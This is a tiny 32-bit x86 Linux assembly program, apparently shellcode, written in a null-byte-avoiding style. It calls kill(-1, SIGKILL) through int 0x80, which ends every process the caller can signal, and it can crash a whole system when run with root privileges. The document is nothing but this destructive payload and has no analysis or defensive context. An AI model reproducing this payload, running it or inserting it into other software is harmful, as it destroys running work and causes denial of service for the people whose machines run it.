section .text
        global _start
_start:
        ; kill(-1, SIGKILL);
        mov al, 40
        sub al, 3
        xor ebx, ebx
        dec ebx
        mov cl, 9
        int 0x80
